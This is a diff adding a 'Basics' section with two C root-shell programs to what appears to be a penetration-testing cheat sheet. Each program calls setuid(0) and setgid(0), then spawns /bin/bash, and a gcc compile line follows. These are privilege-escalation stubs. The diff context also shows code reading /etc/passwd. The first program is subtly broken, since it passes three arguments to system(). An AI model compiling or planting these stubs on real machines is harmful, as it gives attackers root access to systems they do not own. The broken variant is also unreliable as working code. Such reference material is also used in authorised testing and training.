@@ -358,6 +358,46 @@ fs.readFile('/etc/passwd', 'utf8', (err, data) => {
 ## 12 Reporting Tools
 ## 13 Social Engineering Tools
 ## Basics
+	
+### C
+
+#### Shell Option 1
+
+```c
+#include <unistd.h>
+#include <errno.h>
+
+main( int argc, char ** argv, char ** envp )
+{
+    setuid(0);
+    setgid(0);
+    envp = 0;
+    system ("/bin/bash", argv, envp);
+return;
+}
+```
+
+#### Shell Option 2
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdlib.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+
+    system("/bin/bash");
+    return 0;
+}
+```
+
+##### Compiling
+
+```
+$ gcc -o shell shell.c
+```
 
 ### Secure Shell (SSH)
 
